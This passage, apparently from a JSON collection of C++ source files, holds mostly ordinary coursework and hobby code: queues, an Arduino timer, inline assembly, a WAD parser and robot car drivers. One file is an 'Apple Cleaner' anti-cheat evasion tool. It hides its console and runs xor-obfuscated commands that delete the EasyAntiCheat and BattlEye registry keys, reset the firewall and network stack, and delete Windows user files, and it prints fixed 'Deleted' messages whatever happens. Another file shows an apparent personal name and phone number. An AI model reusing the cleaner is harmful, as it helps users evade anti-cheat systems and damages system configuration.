}\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "///Queue threw LinkedList\n#include <iostream>\n#include <ctime>\n#include <cstdlib>\n#include <vector>\n\nusing namespace std;\n\nstruct LinkedQue {  //Structure of data jednosmerneho sezn\n    int data = NULL;\n    LinkedQue *next = nullptr;\n};\n\nstruct Switcher { //Struct of Switcher\n    LinkedQue* begin;\n    LinkedQue* end;\n};\n\nvector <int> CreateArray(){ //Creating a random massive\n    srand (static_cast <unsigned int>(time(0)));\n    vector <int> array(rand() % 100);\n    for (int i = 0; i <= array.size(); i++)\n        array[i] = rand() % 100;\n    return array;\n}\n\nstring IsEmpty(Switcher point){ //We use this func in next funct, cuz its here\n    if (point.begin == point.end && point.begin->data == NULL)\n        return \"YES\\n\";\n    return \"NO\\n\";\n}\n\nSwitcher CreateEmptQ(){ //Create an empty queue\n    Switcher que;\n    LinkedQue *zacatek = new LinkedQue;\n    LinkedQue *konec = zacatek; //Beginning of queue\n    que.begin = zacatek;\n    que.end = konec;\n    return que;\n}\n\nvoid Enqueue(Switcher &point, int x){\n    if (IsEmpty(point) == \"YES\\n\")\n        point.begin->data = x;\n    else {\n        point.end->next = new LinkedQue;\n        point.end = point.end->next;\n        point.end->data = x;\n    }\n}\n\nSwitcher CreateLinQue(vector<int>array) { //Creating a Linked Queue\n    Switcher que;\n    LinkedQue *zacatek = new LinkedQue;\n    LinkedQue *konec = zacatek; //Beginning of queue\n    que.begin = zacatek;\n    for (int i = 0; i < array.size() - 1; i++){ // -1 cuz we always creating a NEW list//ENQUEUE\n        konec->data = array[i]; //Konec se stava zacatkem\n        konec->next = new LinkedQue;\n        konec = konec->next;\n    }\n    konec->data = array[array.size() - 1]; //konec = last element\n    que.end = konec;\n    return que;\n}\n\nint Dequeue(Switcher &point){ //DEQUEUE\n    int tmp = point.begin->data;\n    if (point.begin == point.end)\n        point.begin->data = NULL;\n    else\n        point.begin = point.begin->next;\n    return tmp;\n}\n\nint Front(Switcher point){\n    return point.begin->data;\n}\n\nvoid Vypis(Switcher point){\n    LinkedQue* head = point.begin;\n    while (head != nullptr) {\n        cout << head->data << \" \";\n        head = head->next;\n    }\n}\n\n\nint main() {\n    vector<int>array = CreateArray();\n    Switcher head = CreateLinQue(array);\n    cout << \"Seznam cisel: \";\n    Vypis(head);\n    cout << \"\\nF-ce DEQUEUE: \";\n    cout << \"\\nDELETED ELEMENT: \" << Dequeue(head) << \"\\n\";\n    Vypis(head);\n    cout << \"\\nF-ce FRONT: \";\n    cout << \"\\n\" << Front(head);\n    cout << \"\\nIs queue EMPTY?\\n\";\n    cout << IsEmpty(head);\n    int x;\n    cout << \"Ready to push new QUEUE:)\";\n    Switcher head2 = CreateEmptQ();\n    cout << \"\\nEnter a NUM: \\n\";\n    cin >> x;\n    for (int i = 0; i < x; i++)\n        Enqueue(head2,rand() % 10 + 1);\n    cout << \"\\nYour queue: \";\n    Vypis(head2);\n    return 0;\n}",
    "#include \"TimedAction.h\"\n\n/*\n|| <<constructor>>\n*/\nTimedAction::TimedAction(unsigned long intervl,void (*function)()){\n    active = true;\n\tprevious = 0;\n\tinterval = intervl;\n\texecute = function;\n}\n\n/*\n|| <<constructor>>\n*/\nTimedAction::TimedAction(unsigned long prev,unsigned long intervl,void (*function)()){\n    active = true;\n\tprevious = prev;\n\tinterval = intervl;\n\texecute = function;\n}\n\nvoid TimedAction::reset(){\n    previous = millis();\n}\n\nvoid TimedAction::disable(){\n    active = false;\n}\n\nvoid TimedAction::enable(){\n\tactive = true;\n}\n\n//void TimedAction::check(){\n//  if ( active && (millis()-previous >= interval) ) {\n//    previous = millis();\n//    execute();\n//  }\n//}\n\nvoid TimedAction::check() {\n\t//unsigned long 4,294,967,295 - 4,294,967,295\n\tif (active && ((millis() - previous) >= interval) ) {\n\tprevious = millis();\n\texecute();\n\t}\n\telse if (active && millis()<previous) {\n\t\tunsigned long TMr = (4294967295 - previous);\n\t\tif (TMr < interval) { previous = interval - TMr; }\n\t\telse { previous = millis(); execute(); }\n\t\t//previous =\tinterval - (4294967295- previous) ;\n\t}\n}\n\nvoid TimedAction::setInterval( unsigned long intervl){\n\tinterval = intervl;\n}\n",
    "\ufeff#include \"stdio.h\"\n#pragma warning(disable:4996)\n#include <iostream>\n#include <windows.h>\n#include <time.h>\n#include <conio.h>\n\n\nint uloha_2_1_1() {\n    int result = 0;\n    __asm\n    {\n        MOV eax, 2\n        MOV ebx, 3\n        ADD eax, ebx\n        MOV result, eax\n    }\n    printf(\"%d\\n\", result);\n}\n\nint uloha_2_1_2(int cislo) {\n    int result = 0;\n    __asm\n    {\n        MOV eax, cislo\n        SHL eax, 1\n        MOV result, eax\n    }\n    printf(\"%d\\n\", result);\n}\n\nint uloha_2_1_3(int cislo) {\n    int result = 0;\n    __asm\n    {\n        MOV eax, cislo\n        CMP eax, 9\n        JG point\n        ADD eax, '0'\n        JMP END\n        point :\n        ADD eax, 55\n            JMP END\n            END :\n        MOV result, eax;\n    }\n    printf(\"cislo in hexadecimal = %c\\n\", result);\n}\n\nvoid uloha_2_1_4(unsigned int* a, unsigned int* b, unsigned int* c, unsigned int* d) {\n    __asm\n    {\n        mov eax, 0    // Set up the function code\n        cpuid            // Execute CPUID instruction\n        mov edi, a       // Move the address of a into edi\n        mov[edi], eax   // Store the result of CPUID into a\n        mov edi, b       // Move the address of d into edi\n        mov[edi], ebx   // Store the result of CPUID into d\n        mov edi, c       // Move the address of a into edi\n        mov[edi], ecx   // Store the result of CPUID into a\n        mov edi, d       // Move the address of d into edi\n        mov[edi], edx   // Store the result of CPUID into d\n    }\n}\n\nint uloha_2_2() {\n    char string[] = \"architektura_pocitacov_je_super_predmet\";\n    int strlength = sizeof(string) / sizeof(char);\n    for (int i = 0; i < strlength; i++) {\n        printf(\"%c\", string[i]);\n    }\n    char* pointerstr = string;\n    printf(\"\\n%p\\n\", pointerstr);\n    pointerstr += 1;\n    *pointerstr = *\"A\";\n    for (int i = 0; i < strlength; i++) {\n        printf(\"%c\", string[i]);\n    }\n    pointerstr += 1000000;\n//    *pointerstr = *\"A\";\n    //for (int i = 0; i < strlength; i++) {\n    //    printf(\"%c \", string[i]);\n    //}\n\n\n    int pole[] = { 1, 2, 3, 4, 5 };\n    int length = sizeof(pole) / sizeof(int);\n    printf(\"\\n\");\n    for (int i = 0; i < length; i++) {\n        printf(\"%d \", pole[i]);\n    }\n    int* pointer = pole;\n    printf(\"\\n%p\\n\", pointer);\n    pointer += 1;\n    *pointer = 10;\n    for (int i = 0; i < length; i++) {\n        printf(\"%d \", pole[i]);\n    }\n    return 0;\n}\n\nint uloha_2_3_1() {\n    FILE* fr;\n    FILE* fw;\n    fr = fopen(\"poviedka.html\", \"r\");\n    char ch;\n    if (!fr) {\n        printf(\"not\");\n    }\n    else {\n        while ((ch = fgetc(fr)) != EOF) {\n            int char2 = ch;\n            if (char2 == 165) char2 = 188;\n            else if (char2 == 165) char2 = 188;\n            else if (char2 == 169) char2 = 138;\n            else if (char2 == 171) char2 = 141;\n            else if (char2 == 174) char2 = 142;\n            else if (char2 == 181) char2 = 190;\n            else if (char2 == 185) char2 = 154;\n            else if (char2 == 187) char2 = 157;\n            else if (char2 == 190) char2 = 158;\n            printf(\"%c\", char2);\n        }\n    }\n    return 0;\n}\n\nint uloha_2_5_1_pomocny() {\n    HANDLE  hConsole;\n    hConsole = GetStdHandle(STD_OUTPUT_HANDLE);\n    for (int k = 0; k <= 255; k++) {\n        SetConsoleTextAttribute(hConsole, k);\n        printf(\"color\\n\");\n    }\n    return 0;\n}\n\nint uloha_2_5_1() {\n    HANDLE  hConsole;\n    hConsole = GetStdHandle(STD_OUTPUT_HANDLE);\n    for (int i = 0; i <= 100; i++) {\n        if (i <= 10) {\n            SetConsoleTextAttribute(hConsole, 10);\n        }\n        else if (i <= 22) {\n            SetConsoleTextAttribute(hConsole, 4);\n        }\n        else if (i <= 35) {\n            SetConsoleTextAttribute(hConsole, 1);\n        }\n        else if (i <= 50) {\n            SetConsoleTextAttribute(hConsole, 5);\n        }\n        else if (i <= 100) {\n            SetConsoleTextAttribute(hConsole, 3);\n        }\n        Sleep(100);\n        printf(\"%.3d\\n\", i);\n    }\n    return 0;\n}\n\nint LinePrinf(char text[], char info[], int length) {\n    HANDLE  hConsole;\n    hConsole = GetStdHandle(STD_OUTPUT_HANDLE);\n\n    int k = 0;\n\n    printf(\"%c\", 179);\n    SetConsoleTextAttribute(hConsole, 10);\n    printf(\"%s\", text);\n    SetConsoleTextAttribute(hConsole, 6);\n    printf(\"%c \", 179);\n    for (int j = 0; j < length; j++) {\n        if (length - j <= strlen(info)) {\n            SetConsoleTextAttribute(hConsole, 10);\n            printf(\"%c\", info[k]);\n            k++;\n        }\n        else {\n            printf(\" \");\n        }\n    }\n    SetConsoleTextAttribute(hConsole, 6);\n    printf(\" %c\", 179);\n    return 0;\n}\n\nint uloha_2_5_2() {\n    HANDLE  hConsole;\n    hConsole = GetStdHandle(STD_OUTPUT_HANDLE);\n\n    COORD point = { 50, 10 };\n    char meno[] = \"Roman Rudenko\";\n    char vyska[] = \"180cm\";\n    char hmotnost[] = \"80kg\";\n    char tel[] = \"0968856930\";\n\n    int length = strlen(meno);\n    length = (length >= strlen(vyska)) ? length : strlen(vyska);\n    length = (length >= strlen(hmotnost)) ? leng",
    "#include \"Wad.h\"\n\nWad::Wad(const string &path) {\n    char buffer[4];\n\n    //open the binary file\n    int fd = open(path.c_str(), O_RDONLY);\n\n    //read the first 4 bytes into magic\n    read(fd, magic, 4);\n    magic[4] = '\\0';\n\n    //read the next 4 bytes into numDesc\n    read(fd, buffer, 4);\n    numDesc = *(int*)buffer;\n\n    //read the next 4 bytes into offset and move the fd to start at the offset\n    read(fd, buffer, 4);\n    offset = *(int*)buffer;\n    lseek(fd, offset, SEEK_SET);\n\n    root = new Node(0, 0, \"/\");\n\n    //pointer to the current directory/parent\n    Node* pwd = &(*root);\n    \n    int count = -1;\n    int fileOffset = 0;\n\n    //parse starting from offset\n    for (int i = 0; i < numDesc; i++) {\n        int nOffset;\n        int nLength;\n        char cnName[8];\n        \n        read(fd, &nOffset, 4);\n        read(fd, &nLength, 4);\n        read(fd, &cnName, 8);\n\n        fileOffset += 16;\n\n        string nName(cnName);\n\n        //determine what type of node it is\n        if (nLength == 0 && nName.find(\"START\") != string::npos) { //namespace beginning\n            nName = nName.substr(0, nName.find(\"_START\"));\n            Node* node = new Node(nOffset, nLength, nName);\n            node->parent = pwd;  \n            pwd->children.push_back(node);\n            pwd = node;\n\n        } else if (nName.at(0) == 'E' && nName.at(2) == 'M') { //map marker\n            count = 10;\n            Node* n = new Node(nOffset, nLength, nName);\n            pwd->children.push_back(n);\n            n->parent = pwd;\n            pwd = n;\n\n        } else if (nLength == 0 && nName.find(\"END\") != string::npos) { //namespace end\n            pwd = pwd->parent;\n\n        } else if (count <= 10 && count > 1) { //inside map marker\n            char* data = new char[nLength];\n            \n            lseek(fd, nOffset, SEEK_SET);\n            read(fd, data, nLength);\n\n            Node* node = new Node(nOffset, nLength, nName);\n            node->data = data;\n            node->parent = pwd;\n            pwd->children.push_back(node);\n\n            lseek(fd, offset + fileOffset, SEEK_SET);\n            count--;\n\n\n        } else if (count == 1) { //last element in map marker\n            char* data = new char[nLength];\n\n            lseek(fd, nOffset, SEEK_SET);\n            read(fd, data, nLength);\n\n            Node* node = new Node(nOffset, nLength, nName);\n            node->data = data;\n            node->parent = pwd;\n            pwd->children.push_back(node);\n\n            lseek(fd, offset + fileOffset, SEEK_SET);\n            pwd = pwd->parent;\n            count = -1;\n\n        } else { //files\n            char* data = new char[nLength];\n            \n            lseek(fd, nOffset, SEEK_SET);\n            read(fd, data, nLength);\n\n            Node* node = new Node(nOffset, nLength, nName);\n            node->data = data;\n            node->parent = pwd;\n            pwd->children.push_back(node);\n\n            lseek(fd, offset + fileOffset, SEEK_SET);\n        }\n    }\n\n    close(fd);\n}\n\nWad* Wad::loadWad(const string &path) {\n    Wad* wad = new Wad(path);\n    return wad;\n}\n\nstring Wad::getMagic() {\n    return (string)magic;\n}\n\nbool Wad::isContent(const string &path){\n    if (getNode(path) != nullptr && getNode(path)->children.empty()) {\n        return true;\n    }\n    return false;\n}\n\nbool Wad::isDirectory(const string &path) {\n    if (getNode(path) != nullptr && getNode(path)->length == 0) {\n        return true;\n    }\n    return false;\n}\n\nint Wad::getSize(const string &path) {\n    if (isContent(path)) {\n        return getNode(path)->length;\n    }\n    return -1;\n}\n\nint Wad::getContents(const string &path, char *buffer, int length, int offset) {\n    Node* node = getNode(path);\n    if (isContent(path)) {\n        if (node->length < offset + length) {\n            memcpy(buffer, node->data + offset, node->length - offset);\n            return node->length - offset;\n        }\n        memcpy(buffer, node->data + offset, length);\n        return length;\n    }\n    return -1;\n}\n\nint Wad::getDirectory(const string &path, vector<string> *directory) {\n    if (isDirectory(path)) {\n        Node* node = getNode(path);\n        for (int i = 0; i < node->children.size(); i++) {\n            directory->push_back(node->children[i]->name);\n        }\n        return directory->size();\n    }\n    return -1;\n}\n\nNode* Wad::getNode(const string &path) {\n    Node* curr = root;\n    vector<string> components;\n    int start = 1;\n    int end = path.find('/');\n\n    //separate path into components\n    if (path == \"/\") {\n        return curr;\n    } else {\n        while (end != string::npos) {\n            components.push_back(path.substr(start, end-start));\n            start = end + 1;\n            end = path.find('/', start);\n        }\n\n        if (start != path.length()) {\n            components.push_back(path.substr(start));\n        }\n\n    }\n\n    //search each directory to find the node for the given path\n    bool found = false;\n    for (string c : components) {\n        for (int i = 0; i < cur",
    "#include <iostream>\n#include <vector>\n#include <cstdlib>\n#include <ctime>\n#include <iomanip>\n\nusing namespace std;\n\nconst int PAGE_SIZE = 1024;\nconst int FRAME_SIZE = 1024;\nconst int NUM_PAGES = 64;\nconst int NUM_FRAMES = 8;\n\n\n\nvector<int> pageFrameTable(NUM_PAGES);\n\nint main() {\n    srand(time(nullptr));\n\n    vector<int> physicalMemory(NUM_FRAMES, -1);\n\n   \n    for (int i = 0; i < NUM_PAGES; ++i) {\n        pageFrameTable[i] = i % NUM_FRAMES;\n    }\n    int logicalAddress;\n    cout << \"Enter a logical address(ex: 0x5678): \";\n    cin >> hex >> logicalAddress; \n    //int logicalAddress = 0x5678;\n\n    int pageNumber = logicalAddress / PAGE_SIZE;\n    int offset = logicalAddress % PAGE_SIZE;\n\n    if (pageNumber < NUM_PAGES) {\n        int frameNumber = pageFrameTable[pageNumber];\n        int physicalAddress = frameNumber * FRAME_SIZE + offset;\n\n        cout << \"Logical Address: 0x\" << hex << setw(4) << setfill('0') << logicalAddress\n            << \" => Page Number: 0x\" << setw(2) << setfill('0') << pageNumber\n            << \", Offset: 0x\" << setw(2) << setfill('0') << (offset % 256) << endl;\n    }\n    else {\n        cout << \"Invalid Page Number: \" << pageNumber << endl;\n    }\n\n\n    return 0;\n}\n\n\n",
    "#include <Windows.h>\r\n#include <string>\r\n#include <iostream>\r\n#include \"xor.h\"\r\n#include <urlmon.h>\r\n#include <lmcons.h>\r\n#include \"xor.h\"\r\n#pragma comment(lib, \"urlmon\")\r\n// KRNL ON TOP\r\nstd::wstring GetCurrentUserName()\r\n{\r\n\r\n\r\n\t\r\n\twchar_t un[256 + 1];\r\n\r\n\tDWORD unLen = 256 + 1;\r\n\r\n\tGetUserNameW(un, &unLen);\r\n\r\n\treturn un;\r\n\r\n}\r\nnamespace util {\r\n\r\n\tvoid download_file(LPCSTR dest, LPCSTR url)\r\n\t{\r\n\r\n\t\tURLDownloadToFileA(NULL, dest, url, NULL, NULL);\r\n\r\n\r\n\t}\r\n\r\n\tvoid hide()\r\n\t{\r\n\t\t::ShowWindow(::GetConsoleWindow(), SW_HIDE);\r\n\t}\r\n\tvoid show()\r\n\t{\r\n\t\t::ShowWindow(::GetConsoleWindow(), SW_SHOW);\r\n\t}\r\n}\r\n\r\n\r\nusing namespace std;\r\n\r\n\r\nvoid clean_launcher() {\r\n\r\n\tDeleteFileW(L\"C:\\\\Program Files(x86)\\\\Epic Games\\\\Launcher\\\\Engine\\\\Config\\\\Base.ini\");\r\n\tDeleteFileW(L\"C:\\\\Program Files(x86)\\\\Epic Games\\\\Launcher\\\\Engine\\\\Config\\\\BaseGame.ini\");\r\n\tDeleteFileW(L\"C:\\\\Program Files(x86)\\\\Epic Games\\\\Launcher\\\\Engine\\\\Config\\\\Windows\\\\WindowsGame.ini\");\r\n\tDeleteFileW(L\"C:\\\\Program Files(x86)\\\\Epic Games\\\\Launcher\\\\Engine\\\\Config\\\\BaseInput.ini\");\r\n\tDeleteFileW(L\"C:\\\\Program Files(x86)\\\\Epic Games\\\\Launcher\\\\Portal\\\\Config\\\\UserLightmass.ini\");\r\n\tDeleteFileW(L\"C:\\\\Program Files(x86)\\\\Epic Games\\\\Launcher\\\\Engine\\\\Config\\\\Windows\\\\BaseWindowsLightmass.ini\");\r\n\tDeleteFileW(L\"C:\\\\Program Files(x86)\\Epic Games\\\\Launcher\\\\Portal\\\\Config\\\\UserScalability.ini\");\r\n\tDeleteFileW(L\"C:\\\\Program Files(x86)\\Epic Games\\\\Launcher\\\\Engine\\\\Config\\\\BaseHardware.ini\");\r\n\tDeleteFileW(L\"C:\\\\Program Files(x86)\\Epic Games\\\\Launcher\\\\Portal\\\\Config\\\\NotForLicensees\\\\Windows\\\\WindowsHardware.ini\");\r\n}\r\nvoid clean_net() {\r\n\tutil::hide();\r\n\tsystem(_xor_(\"netsh winsock reset\").c_str());\r\n\tsystem(_xor_(\"netsh winsock reset catalog\").c_str());\r\n\tsystem(_xor_(\"netsh int ip reset\").c_str());\r\n\tsystem(_xor_(\"netsh advfirewall reset\").c_str());\r\n\tsystem(_xor_(\"netsh int reset all\").c_str());\r\n\tsystem(_xor_(\"netsh int ipv4 reset\").c_str());\r\n\tsystem(_xor_(\"netsh int ipv6 reset\").c_str());\r\n\tsystem(_xor_(\"ipconfig / release\").c_str());\r\n\tsystem(_xor_(\"ipconfig / renew\").c_str());\r\n\tsystem(_xor_(\"ipconfig / flushdns\").c_str());\r\n\tsystem(\"cls\");\r\n\tutil::show();\r\n}\r\nvoid clean_anticheat() {\r\n\tsystem(_xor_(\"reg delete HKLM\\\\SOFTWARE\\\\WOW6432Node\\\\EasyAntiCheat /f\").c_str());\r\n\tsystem(_xor_(\"reg delete HKLM\\\\SYSTEM\\\\ControlSet001\\\\Services\\\\EasyAntiCheat /f\").c_str());\r\n\tsystem(_xor_(\"reg delete HKLM\\\\SYSTEM\\\\ControlSet001\\\\Services\\\\BEService /f\").c_str());\r\n}\r\nint main()\r\n{\r\n\tSleep(500);\r\n\r\n\tutil::hide();\r\n\r\n\tSleep(2000);\r\n\tutil::show();\r\n\r\n\tsystem(\"Color 0b\");\r\n\t// LAUNCH CLEAN\r\n\tSetConsoleTitleA(\"Apple Cleaner (Updated to S4)\");\r\n\tprintf(\"Apple Cleaner\\n\\n\");\r\n\tprintf(\"[+] Searching for tracking files...\");\r\n\tDeleteFileW((LR\"(C:\\Users\\)\" + GetCurrentUserName() + LR\"(\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat.LOCK)\").c_str());\r\n\tif (DeleteFileW((LR\"(C:\\Users\\)\" + GetCurrentUserName() + LR\"(\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat)\").c_str()) != 0)\r\n\tprintf(\"Deleted C:\\\\Users\\\\Gaypple\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\UsrClass.dat\\n\");\r\n\tif (DeleteFileW((LR\"(C:\\Users\\)\" + GetCurrentUserName() + LR\"(AppData\\Local\\Microsoft\\Windows\\UsrClass.dat)\").c_str()) != 0)\r\n\tprintf(\"Deleted C:\\\\Users\\\\Gaypple\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\UsrClass.dat\\n\");\r\n\tif (DeleteFileW((LR\"(C:\\Users\\)\" + GetCurrentUserName() + LR\"(\\AppData\\Local\\Microsoft\\Windows\\usrclass.dat)\").c_str()) != 0)\r\n\tprintf(\"Deleted C:\\\\Users\\\\Gaypple\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\usrclass.dat\\n\");\r\n\tif (DeleteFileW((LR\"(C:\\Users\\)\" + GetCurrentUserName() + LR\"(AppData\\Local\\Microsoft\\Windows\\usrclass.dat)\").c_str()) != 0)\r\n\tprintf(\"Deleted C:\\\\Users\\\\Gaypple\\\\AppData\\\\Local\\\\Microsoft\\\\Vault\\\\UserProfileRoaming\\\\Latest.dat\\n\");\r\n\tif (DeleteFileW((LR\"(C:\\Users\\)\" + GetCurrentUserName() + LR\"(\\AppData\\Local\\Microsoft\\Vault\\UserProfileRoaming\\Latest.dat)\").c_str()) != 0)\r\n\t\r\n\t\t\r\n\t\tprintf(\"Deleted C:\\\\Users\\\\Gaypple\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\UsrClass.dat.log1\\n\");\r\n\tprintf(\"\\nDeleted C:\\\\Users\\\\Gaypple\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\IE\\\\container.dat\");\r\n        printf(\"\\n[+] System clean\");\r\n\t\tprintf(\"\\nPress any key to continue . . .\");\r\n\t// END OF LAUNCH CLEAN\r\n\tsystem(\"pause > nul\");\t\r\n\r\n\r\n\t\r\n\tsystem(\"cls\");\r\n\t\r\n\r\n\tSleep(2000);\r\n\r\n\tDeleteFileW((LR\"(C:\\Users\\)\" + GetCurrentUserName() + LR\"(\\AppData\\Local\\Microsoft\\Windows\\History\\desktop.ini)\").c_str());\r\n\r\n\tif (DeleteFileW((LR\"(C:\\Users\\AppData\\Local\\Microsoft\\Windows\\History\\)\" + GetCurrentUserName() + LR\"(\\desktop.ini)\").c_str()) != 0)\r\n\t\tprintf(\"Deleted C:\\\\Users\\\\Gaypple\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\desktop.ini\");\r\n\r\n\t\t//cout << \"Deleted C:\\\\Users\\\\Gaypple\\\\ntuser.ini:NTV\" << endl;\r\n\tprintf(\"\\nDeleted C:\\\\Users\\\\Gaypple\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\IE\\\\container.dat\");\r\n\t\tDeleteFileW((LR\"(C:\\Users\\)\" + GetCurrentUserName() + LR\"(\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat.LOCK)\").c_str());\r\n\t\tSleep(2000);\r\n\tDeleteFileW((LR\"(D:\\Users\\)\" + GetCurrentUserName() + LR\"(\\App",
    "//Victor Lopez (vml45)\n//Ali Khawaja (xyr5)\n#include <iostream>\n#include <iomanip>\n#include <bitset>\n#include <sstream>\n#include <limits>\n\nusing namespace std;\n\n// Function to convert a float value to IEEE 754 bit representation\nbitset<32> cvtToIEEE(float f) {\n    auto *bits_ptr = reinterpret_cast<unsigned int *>(&f);\n    bitset<32> bs(*bits_ptr);\n    return bs;\n}\n\nint main(int argc, char *argv[]) {\n    // Check if the number of arguments is correct\n    if (argc != 3) {\n        cout << \"usage: \" << argv[0] << \" loop_bound loop_counter\" << endl;\n        return 1; // indicate error\n    }\n\n    // Parse command-line arguments\n    float loopBound, loopCounter;\n    stringstream(argv[1]) >> loopBound;\n    stringstream(argv[2]) >> loopCounter;\n\n    // Display loop bound and loop counter IEEE representations\n    cout << \"Loop bound: 0 \";\n    cout << cvtToIEEE(loopBound).to_string().substr(1, 8) << \" \";\n    cout << cvtToIEEE(loopBound).to_string().substr(9) << endl;\n\n    cout << \"Loop counter: 0 \";\n    cout << cvtToIEEE(loopCounter).to_string().substr(1, 8) << \" \";\n    cout << cvtToIEEE(loopCounter).to_string().substr(9) << endl;\n\n    // Extract exponents\n    int boundExponent = (cvtToIEEE(loopBound) >> 23).to_ulong();\n    int counterExponent = (cvtToIEEE(loopCounter) >> 23).to_ulong();\n\n    // Check for potential overflow\n    int expDiff = abs(boundExponent - counterExponent);\n    if (expDiff >= 23) { // Exponent difference more than or equal to 23 indicates overflow\n        cout << \"Warning: Possible overflow!\" << endl;\n        cout << \"Overflow threshold:\" << endl;\n        float overflow_threshold = numeric_limits<float>::max() / 2;\n        cout << scientific << setprecision(6) << overflow_threshold << endl;\n        cout << \"0 \";\n        cout << cvtToIEEE(overflow_threshold).to_string().substr(1, 8) << \" \";\n        cout << cvtToIEEE(overflow_threshold).to_string().substr(9) << endl;\n    } else {\n        cout << \"There is no overflow!\" << endl;\n    }\n\n    return 0;\n}\n",
    "/*\n * @Author: ELEGOO\n * @Date: 2019-10-22 11:59:09\n * @LastEditTime: 2020-12-29 16:07:48\n * @LastEditors: Changhua\n * @Description: Smart Robot Car V4.0\n * @FilePath: \n */\n#include \"DeviceDriverSet_xxx0.h\"\n//#include \"PinChangeInt.h\"\n#include <avr/wdt.h>\nstatic void\ndelay_xxx(uint16_t _ms)\n{\n  wdt_reset();\n  for (unsigned long i = 0; i < _ms; i++)\n  {\n    delay(1);\n  }\n}\n/*RBG LED*/\nstatic uint32_t Color(uint8_t r, uint8_t g, uint8_t b)\n{\n  return (((uint32_t)r << 16) | ((uint32_t)g << 8) | b);\n}\nvoid DeviceDriverSet_RBGLED::DeviceDriverSet_RBGLED_xxx(uint16_t Duration, uint8_t Traversal_Number, CRGB colour)\n{\n  if (NUM_LEDS < Traversal_Number)\n  {\n    Traversal_Number = NUM_LEDS;\n  }\n  for (int Number = 0; Number < Traversal_Number; Number++)\n  {\n    leds[Number] = colour;\n    FastLED.show();\n    delay_xxx(Duration);\n  }\n}\nvoid DeviceDriverSet_RBGLED::DeviceDriverSet_RBGLED_Init(uint8_t set_Brightness)\n{\n  FastLED.addLeds<NEOPIXEL, PIN_RBGLED>(leds, NUM_LEDS);\n  FastLED.setBrightness(set_Brightness);\n}\n#if _Test_DeviceDriverSet\nvoid DeviceDriverSet_RBGLED::DeviceDriverSet_RBGLED_Test(void)\n{\n  leds[0] = CRGB::White;\n  FastLED.show();\n  delay_xxx(50);\n  leds[1] = CRGB::Red;\n  FastLED.show();\n  delay_xxx(50);\n  DeviceDriverSet_RBGLED_xxx(50 /*Duration*/, 5 /*Traversal_Number*/, CRGB::Black);\n}\n#endif\n\nvoid DeviceDriverSet_RBGLED::DeviceDriverSet_RBGLED_Color(uint8_t LED_s, uint8_t r, uint8_t g, uint8_t b)\n{\n  if (LED_s > NUM_LEDS)\n    return;\n  if (LED_s == NUM_LEDS)\n  {\n    FastLED.showColor(Color(r, g, b));\n  }\n  else\n  {\n    leds[LED_s] = Color(r, g, b);\n  }\n  FastLED.show();\n}\n\n/*Key*/\nuint8_t DeviceDriverSet_Key::keyValue = 0;\n\nstatic void attachPinChangeInterrupt_GetKeyValue(void)\n{\n  DeviceDriverSet_Key Key;\n  static uint32_t keyValue_time = 0;\n  static uint8_t keyValue_temp = 0;\n  if ((millis() - keyValue_time) > 500)\n  {\n    keyValue_temp++;\n    keyValue_time = millis();\n    if (keyValue_temp > keyValue_Max)\n    {\n      keyValue_temp = 0;\n    }\n    Key.keyValue = keyValue_temp;\n  }\n}\nvoid DeviceDriverSet_Key::DeviceDriverSet_Key_Init(void)\n{\n  pinMode(PIN_Key, INPUT_PULLUP);\n  //attachPinChangeInterrupt(PIN_Key, attachPinChangeInterrupt_GetKeyValue, FALLING);\n  attachInterrupt(0, attachPinChangeInterrupt_GetKeyValue, FALLING);\n}\n\n#if _Test_DeviceDriverSet\nvoid DeviceDriverSet_Key::DeviceDriverSet_Key_Test(void)\n{\n  Serial.println(DeviceDriverSet_Key::keyValue);\n}\n#endif\n\nvoid DeviceDriverSet_Key::DeviceDriverSet_key_Get(uint8_t *get_keyValue)\n{\n  *get_keyValue = keyValue;\n}\n\n/*ITR20001 Detection*/\nbool DeviceDriverSet_ITR20001::DeviceDriverSet_ITR20001_Init(void)\n{\n  pinMode(PIN_ITR20001xxxL, INPUT);\n  pinMode(PIN_ITR20001xxxM, INPUT);\n  pinMode(PIN_ITR20001xxxR, INPUT);\n  return false;\n}\nint DeviceDriverSet_ITR20001::DeviceDriverSet_ITR20001_getAnaloguexxx_L(void)\n{\n  return analogRead(PIN_ITR20001xxxL);\n}\nint DeviceDriverSet_ITR20001::DeviceDriverSet_ITR20001_getAnaloguexxx_M(void)\n{\n  return analogRead(PIN_ITR20001xxxM);\n}\nint DeviceDriverSet_ITR20001::DeviceDriverSet_ITR20001_getAnaloguexxx_R(void)\n{\n  return analogRead(PIN_ITR20001xxxR);\n}\n#if _Test_DeviceDriverSet\nvoid DeviceDriverSet_ITR20001::DeviceDriverSet_ITR20001_Test(void)\n{\n  Serial.print(\"\\tL=\");\n  Serial.print(analogRead(PIN_ITR20001xxxL));\n\n  Serial.print(\"\\tM=\");\n  Serial.print(analogRead(PIN_ITR20001xxxM));\n\n  Serial.print(\"\\tR=\");\n  Serial.println(analogRead(PIN_ITR20001xxxR));\n}\n#endif\n\n/*Voltage Detection*/\nvoid DeviceDriverSet_Voltage::DeviceDriverSet_Voltage_Init(void)\n{\n  pinMode(PIN_Voltage, INPUT);\n  //analogReference(INTERNAL);\n}\nfloat DeviceDriverSet_Voltage::DeviceDriverSet_Voltage_getAnalogue(void)\n{\n  //float Voltage = ((analogRead(PIN_Voltage) * 5.00 / 1024) * 7.67); //7.66666=((10 + 1.50) / 1.50)\n  float Voltage = (analogRead(PIN_Voltage) * 0.0375);\n  Voltage = Voltage + (Voltage * 0.08); //Compensation 8%\n  //return (analogRead(PIN_Voltage) * 5.00 / 1024) * ((10 + 1.50) / 1.50); //Read voltage value\n  return Voltage;\n}\n\n#if _Test_DeviceDriverSet\nvoid DeviceDriverSet_Voltage::DeviceDriverSet_Voltage_Test(void)\n{\n  //float Voltage = ((analogRead(PIN_Voltage) * 5.00 / 1024) * 7.67); //7.66666=((10 + 1.50) / 